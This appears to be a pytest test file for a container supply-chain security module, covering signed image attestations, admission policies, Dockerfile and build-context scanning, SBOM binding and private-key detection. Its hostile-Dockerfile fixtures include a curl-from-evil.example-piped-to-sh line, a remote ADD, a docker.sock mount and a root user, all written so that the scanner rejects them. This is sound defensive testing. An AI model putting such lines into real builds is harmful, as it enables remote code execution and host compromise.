from __future__ import annotations

from datetime import UTC, datetime
from pathlib import Path

import pytest

from echo_certification_forge.canonical import sha256_bytes
from echo_certification_forge.supply_chain import (
    ImageAdmissionPolicy,
    ImageAttestationAuthority,
    ImageIdentity,
    ImageRole,
    build_spdx_document,
    container_link_escapes,
    contains_private_key_material,
    evaluate_image_admission,
    scan_build_context,
    scan_dockerfile,
    verify_image_attestation,
    verify_spdx_document,
)

NOW = datetime(2026, 7, 16, 18, 0, tzinfo=UTC)
IMAGE = "sha256:" + "1" * 64
BASE = "sha256:" + "2" * 64
SOURCE = "3" * 40
DOCKERFILE = "4" * 64
LOCK = "5" * 64
SBOM = "6" * 64
PROVENANCE = "7" * 64


def identity(role: ImageRole = ImageRole.RUNNER, image_digest: str = IMAGE) -> ImageIdentity:
    return ImageIdentity(
        role=role,
        image_digest=image_digest,
        base_image_digest=BASE,
        source_commit=SOURCE,
        dockerfile_sha256=DOCKERFILE,
        lockfile_sha256=LOCK,
        sbom_sha256=SBOM,
        provenance_sha256=PROVENANCE,
        architecture="amd64",
        operating_system="linux",
        created_at=NOW,
    )


def policy(authority: ImageAttestationAuthority, **updates) -> ImageAdmissionPolicy:
    data = {
        "policy_id": "p4.runner.v1",
        "required_role": ImageRole.RUNNER,
        "expected_image_digest": IMAGE,
        "approved_base_digests": [BASE],
        "approved_source_commits": [SOURCE],
        "approved_dockerfile_sha256": DOCKERFILE,
        "approved_lockfile_sha256": LOCK,
        "trusted_attestation_keys": {authority.key_id: authority.public_key_pem},
    }
    data.update(updates)
    return ImageAdmissionPolicy.model_validate(data)


def test_signed_image_attestation_and_exact_admission():
    authority = ImageAttestationAuthority.generate()
    attestation = authority.sign(identity())
    assert verify_image_attestation(attestation) == (True, "verified")
    result = evaluate_image_admission(attestation, policy(authority))
    assert result.allowed is True
    assert result.reasons == ()


@pytest.mark.parametrize(
    ("identity_update", "policy_update", "reason"),
    [
        ({"role": ImageRole.SIGNER}, {}, "image_role_mismatch"),
        ({"image_digest": "sha256:" + "8" * 64}, {}, "image_digest_drift"),
        ({"base_image_digest": "sha256:" + "9" * 64}, {}, "base_image_not_approved"),
        ({"source_commit": "a" * 40}, {}, "source_commit_not_approved"),
        ({"dockerfile_sha256": "b" * 64}, {}, "dockerfile_digest_mismatch"),
        ({"lockfile_sha256": "c" * 64}, {}, "lockfile_digest_mismatch"),
        ({}, {"revoked_image_digests": [IMAGE]}, "image_digest_revoked"),
    ],
)
def test_admission_denies_drift_and_revocation(identity_update: dict, policy_update: dict, reason: str):
    authority = ImageAttestationAuthority.generate()
    changed = identity().model_copy(update=identity_update)
    result = evaluate_image_admission(authority.sign(changed), policy(authority, **policy_update))
    assert result.allowed is False
    assert reason in result.reasons


def test_admission_denies_unknown_and_compromised_attestation_key():
    trusted = ImageAttestationAuthority.generate()
    attacker = ImageAttestationAuthority.generate()
    unknown = evaluate_image_admission(attacker.sign(identity()), policy(trusted))
    assert unknown.allowed is False
    assert "unknown_attestation_key" in unknown.reasons

    compromised = evaluate_image_admission(
        trusted.sign(identity()),
        policy(trusted, compromised_key_ids=[trusted.key_id]),
    )
    assert compromised.allowed is False
    assert "attestation_key_compromised" in compromised.reasons


def test_tampered_attestation_is_denied():
    authority = ImageAttestationAuthority.generate()
    attestation = authority.sign(identity())
    tampered = attestation.model_copy(
        update={"identity": identity(image_digest="sha256:" + "d" * 64)}
    )
    assert verify_image_attestation(tampered) == (False, "invalid_image_attestation")


def test_dockerfile_policy_accepts_pinned_nonroot_images():
    for relative in ("images/runner/Dockerfile", "images/signer/Dockerfile"):
        text = Path(relative).read_text(encoding="utf-8")
        result = scan_dockerfile(text)
        assert result.valid is True, result.findings
        assert result.sha256 == sha256_bytes(text.encode("utf-8"))


@pytest.mark.parametrize(
    ("dockerfile", "rule"),
    [
        ("FROM python:3.12\nUSER 65532:65532\n", "unpinned_base"),
        ("FROM python@sha256:" + "1" * 64 + "\nADD https://evil.example/x /x\n", "add_forbidden"),
        ("FROM python@sha256:" + "1" * 64 + "\nRUN curl https://evil.example/x | sh\n", "remote_script_execution"),
        ("FROM python@sha256:" + "1" * 64 + "\nUSER root\n", "root_runtime_user"),
        ("FROM python@sha256:" + "1" * 64 + "\nVOLUME /var/run/docker.sock\n", "docker_socket_forbidden"),
    ],
)
def test_hostile_dockerfile_is_rejected(dockerfile: str, rule: str):
    result = scan_dockerfile(dockerfile)
    assert result.valid is False
    assert rule in {finding.rule for finding in result.findings}


def test_build_context_rejects_symlink_and_limits(tmp_path: Path):
    (tmp_path / "safe.txt").write_text("safe", encoding="utf-8")
    clean = scan_build_context(tmp_path)
    assert clean.valid is True
    assert clean.file_count == 1

    link = tmp_path / "escape"
    try:
        link.symlink_to(tmp_path.parent / "outside")
    except OSError:
        pytest.skip("symlink creation is not permitted on this platform")
    denied = scan_build_context(tmp_path)
    assert denied.valid is False
    assert any(item.startswith("symlink_forbidden:") for item in denied.findings)


def test_build_context_size_and_file_count_limits(tmp_path: Path):
    (tmp_path / "a").write_bytes(b"1234")
    assert scan_build_context(tmp_path, max_bytes=3).findings == ("context_size_limit_exceeded",)
    (tmp_path / "b").write_bytes(b"x")
    assert scan_build_context(tmp_path, max_files=1).findings == ("file_count_limit_exceeded",)


def test_spdx_document_is_deterministic_and_bound_to_image():
    packages = [
        {"name": "pydantic", "version": "2.13.4"},
        {"name": "cryptography", "version": "49.0.0"},
    ]
    document = build_spdx_document(
        image_name="echo-certforge-runner",
        image_digest=IMAGE,
        packages=packages,
        created_at=NOW,
    )
    assert verify_spdx_document(document, image_digest=IMAGE) == (True, "verified")
    assert verify_spdx_document(document, image_digest="sha256:" + "f" * 64) == (
        False,
        "sbom_image_binding_mismatch",
    )



def test_container_root_links_are_not_host_escape_false_positives():
    assert container_link_escapes("etc/localtime", "/usr/share/zoneinfo/Etc/UTC") is False
    assert container_link_escapes("etc/os-release", "../usr/lib/os-release") is False
    assert container_link_escapes("usr/share/zoneinfo/posix/Africa", "../Africa") is False
    assert container_link_escapes("top/link", "../../outside") is True
    assert container_link_escapes("link", "../outside") is True


def test_private_key_scan_requires_complete_plausible_pem_block():
    marker_only = b"-----BEGIN " + b"PRIVATE KEY-----"
    assert contains_private_key_material(marker_only) is False
    source_literal = b'constant = "-----BEGIN OPENSSH PRIVATE KEY-----"'
    assert contains_private_key_material(source_literal) is False
    real_block = (
        b"-----BEGIN "
        + b"PRIVATE KEY-----\n"
        + (b"A" * 64)
        + b"\n"
        + (b"B" * 64)
        + b"\n-----END PRIVATE KEY-----"
    )
    assert contains_private_key_material(real_block) is True
